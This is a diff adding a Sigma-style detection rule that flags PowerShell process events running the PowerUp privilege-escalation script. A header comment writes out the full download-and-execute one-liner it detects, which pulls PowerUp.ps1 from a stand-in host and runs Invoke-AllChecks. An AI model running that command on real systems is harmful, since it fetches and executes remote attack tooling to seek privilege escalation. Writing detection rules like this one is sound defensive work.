@@ -1,0 +1,17 @@
+# Image: powershell.exe
+# Command Line: powershell "iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;"
+
+title: PowerUp Enumeration
+description: powerup_enumeration
+detection:
+    selection:
+        EventID: 1
+        Image|endswith: 'powershell.exe'
+        CommandLine|contains|all:
+        - 'iex'
+        - 'new-object'
+        - 'net.webclient'
+        - 'downloadstring'
+        - 'PowerUp'
+        - 'Invoke-AllChecks'
+    condition: selection
